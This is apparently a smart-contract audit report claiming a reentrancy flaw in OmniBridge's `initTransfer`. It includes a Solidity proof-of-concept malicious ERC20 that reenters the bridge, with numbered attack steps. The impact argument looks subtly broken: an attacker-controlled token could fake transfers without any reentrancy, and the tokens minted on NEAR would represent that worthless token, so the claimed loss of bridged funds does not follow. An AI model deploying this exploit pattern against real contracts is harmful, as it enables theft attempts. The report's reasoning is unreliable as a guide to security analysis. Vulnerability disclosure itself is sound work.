### Title
Reentrancy in `initTransfer` via Malicious ERC20 `transferFrom` Enables Unauthorized Minting on NEAR Without Locking EVM Tokens - (File: evm/src/omni-bridge/contracts/OmniBridge.sol)

---

### Summary

`initTransfer` in `OmniBridge.sol` makes an external call to an arbitrary ERC20 token's `transferFrom` for non-bridge tokens before the `InitTransfer` event is emitted, with no reentrancy guard. A malicious ERC20 can reenter `initTransfer` during this call, causing two `InitTransfer` events to be emitted with distinct nonces while zero tokens are actually locked in the bridge. The NEAR side processes each `InitTransfer` event independently and mints tokens for each, breaking the 1:1 EVM-locking-to-NEAR-minting invariant.

---

### Finding Description

`initTransfer` is `external payable` with no `nonReentrant` modifier. [1](#0-0) 

The nonce is incremented at line 381 before any external call, which means a reentrant invocation receives a fresh, distinct nonce — it does not collide with the outer call's nonce. This is the only "protection" present.

For non-bridge, non-custom-minter ERC20 tokens the code reaches the `else` branch: [2](#0-1) 

`IERC20(tokenAddress).safeTransferFrom(msg.sender, address(this), amount)` is an external call to an **arbitrary, attacker-controlled contract**. There is no whitelist for which ERC20 addresses may be used in `initTransfer`. The `InitTransfer` event is only emitted **after** this external call returns: [3](#0-2) 

A malicious token's `transferFrom` can therefore:
1. Reenter `initTransfer` with the same parameters.
2. In the inner call, `currentOriginNonce` is incremented again (nonce N+2), and the inner `safeTransferFrom` is called — the malicious token returns `true` without moving any tokens.
3. The inner call emits `InitTransfer` with nonce N+2 and returns.
4. Control returns to the outer `transferFrom`, which also returns `true` without moving tokens.
5. The outer call emits `InitTransfer` with nonce N+1.

Two valid `InitTransfer` events are on-chain; zero tokens were locked.

The NEAR-side `fin_transfer_callback` processes each `InitTransfer` proof independently. It checks that the emitter address matches a registered factory and that the token is registered, then mints/transfers tokens to the recipient: [4](#0-3) 

Both events pass these checks (same factory, same registered token), so the NEAR side mints the full amount twice.

`initTransfer1155` has the same structural flaw — `currentOriginNonce` is incremented before `IERC1155(tokenAddress).safeTransferFrom(...)` is called, and no reentrancy guard is present: [5](#0-4) 

---

### Impact Explanation

An attacker can emit N `InitTransfer` events while locking 0 tokens on EVM. The NEAR side mints N × `amount` tokens for the attacker's NEAR account. This is a direct, permanent loss of bridged funds: the NEAR-side supply of the bridged token is inflated without any EVM-side collateral, breaking the escrow invariant that is the bridge's core security property.

---

### Likelihood Explanation

The attack requires only:
1. Deploying a malicious ERC20 (permissionless).
2. Calling `logMetadata(maliciousToken)` on EVM (permissionless — no access control): [6](#0-5) 

3. Waiting for the NEAR side to register the token via the normal bridge flow (relayer-driven, no admin action needed beyond the standard bridge operation).
4. Calling `initTransfer` with the malicious token.

No privileged access, no leaked keys, no validator collusion, and no front-running is required. Any unprivileged user who can deploy an ERC20 can execute this attack.

---

### Recommendation

Add OpenZeppelin's `ReentrancyGuardUpgradeable` to `OmniBridge` and apply `nonReentrant` to `initTransfer`, `initTransfer1155`, `finTransfer`, and `deployToken`. Alternatively, strictly enforce the Checks-Effects-Interactions pattern by emitting the `InitTransfer` event and updating all state **before** any external token call — though a guard is more robust given the multiple external call sites.

---

### Proof of Concept

```solidity
// SPDX-License-Identifier: GPL-3.0-or-later
pragma solidity ^0.8.24;

import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

interface IBridge {
    function initTransfer(
        address tokenAddress,
        uint128 amount,
        uint128 fee,
        uint128 nativeFee,
        string calldata recipient,
        string calldata message
    ) external payable;
}

contract MaliciousERC20 {
    IBridge public bridge;
    bool public reentered;

    constructor(address _bridge) {
        bridge = IBridge(_bridge);
    }

    // Standard ERC20 stubs
    function name() external pure returns (string memory) { return "Evil"; }
    function symbol() external pure returns (string memory) { return "EVIL"; }
    function decimals() external pure returns (uint8) { return 18; }
    function approve(address, uint256) external pure returns (bool) { return true; }
    function allowance(address, address) external pure returns (uint256) { return type(uint256).max; }
    function balanceOf(address) external pure returns (uint256) { return type(uint256).max; }

    function transferFrom(address, address, uint256 amount) external returns (bool) {
        if (!reentered) {
            reentered = true;
            // Reenter: emits InitTransfer with nonce N+2, no tokens moved
            bridge.initTransfer(address(this), uint128(amount), 0, 0, "attacker.near", "");
        }
        // Both calls return true without moving tokens
        return true;
    }
}

// Attack steps:
// 1. Deploy MaliciousERC20(bridgeAddress)
// 2. Call bridge.logMetadata(address(maliciousERC20))  -- permissionless
// 3. Wait for NEAR side to register the token
// 4. Call bridge.initTransfer(address(maliciousERC20), 1e18, 0, 0, "attacker.near", "")
//    -> emits InitTransfer(nonce=N+1) and InitTransfer(nonce=N+2)
//    -> 0 tokens locked on EVM
//    -> NEAR side mints 2e18 tokens for attacker.near
```

The NEAR-side `fin_transfer_callback` will accept both proofs because both nonces are distinct, the emitter matches the registered factory, and the token is registered. The result is 2× minting with 0× locking. [7](#0-6)

### Citations

**File:** evm/src/omni-bridge/contracts/OmniBridge.sol (L224-232)
```text
    function logMetadata(address tokenAddress) external payable {
        string memory name = IERC20Metadata(tokenAddress).name();
        string memory symbol = IERC20Metadata(tokenAddress).symbol();
        uint8 decimals = IERC20Metadata(tokenAddress).decimals();

        logMetadataExtension(tokenAddress, name, symbol, decimals);

        emit BridgeTypes.LogMetadata(tokenAddress, name, symbol, decimals);
    }
```

**File:** evm/src/omni-bridge/contracts/OmniBridge.sol (L373-381)
```text
    function initTransfer(
        address tokenAddress,
        uint128 amount,
        uint128 fee,
        uint128 nativeFee,
        string calldata recipient,
        string calldata message
    ) external payable whenNotPaused(PAUSED_INIT_TRANSFER) {
        currentOriginNonce += 1;
```

**File:** evm/src/omni-bridge/contracts/OmniBridge.sol (L406-412)
```text
            } else {
                IERC20(tokenAddress).safeTransferFrom(
                    msg.sender,
                    address(this),
                    amount
                );
            }
```

**File:** evm/src/omni-bridge/contracts/OmniBridge.sol (L427-436)
```text
        emit BridgeTypes.InitTransfer(
            msg.sender,
            tokenAddress,
            currentOriginNonce,
            amount,
            fee,
            nativeFee,
            recipient,
            message
        );
```

**File:** evm/src/omni-bridge/contracts/OmniBridge.sol (L447-464)
```text
    ) external payable whenNotPaused(PAUSED_INIT_TRANSFER) {
        currentOriginNonce += 1;
        if (fee >= amount) {
            revert InvalidFee();
        }

        address deterministicToken = deriveDeterministicAddress(
            tokenAddress,
            tokenId
        );

        IERC1155(tokenAddress).safeTransferFrom(
            msg.sender,
            address(this),
            tokenId,
            amount,
            ""
        );
```

**File:** near/omni-bridge/src/lib.rs (L700-746)
```rust
    pub fn fin_transfer_callback(
        &mut self,
        #[serializer(borsh)] storage_deposit_actions: &Vec<StorageDepositAction>,
        #[serializer(borsh)] predecessor_account_id: AccountId,
    ) -> PromiseOrValue<Nonce> {
        let Ok(ProverResult::InitTransfer(init_transfer)) = Self::decode_prover_result(0) else {
            env::panic_str(BridgeError::InvalidProofMessage.to_string().as_str())
        };
        require!(
            self.factories
                .get(&init_transfer.emitter_address.get_chain())
                == Some(init_transfer.emitter_address),
            BridgeError::UnknownFactory.as_ref()
        );

        let decimals = self
            .token_decimals
            .get(&init_transfer.token)
            .near_expect(BridgeError::TokenDecimalsNotFound);

        let destination_nonce =
            self.get_next_destination_nonce(init_transfer.recipient.get_chain());
        let transfer_message = TransferMessage {
            origin_nonce: init_transfer.origin_nonce,
            token: init_transfer.token,
            amount: Self::denormalize_amount(init_transfer.amount.0, decimals).into(),
            recipient: init_transfer.recipient,
            fee: Self::denormalize_fee(&init_transfer.fee, decimals),
            sender: init_transfer.sender,
            msg: init_transfer.msg,
            destination_nonce,
            origin_transfer_id: None,
        };

        if let OmniAddress::Near(recipient) = transfer_message.recipient.clone() {
            self.process_fin_transfer_to_near(
                recipient,
                &predecessor_account_id,
                transfer_message,
                storage_deposit_actions,
            )
            .into()
        } else {
            self.process_fin_transfer_to_other_chain(predecessor_account_id, transfer_message);
            PromiseOrValue::Value(destination_nonce)
        }
    }
```
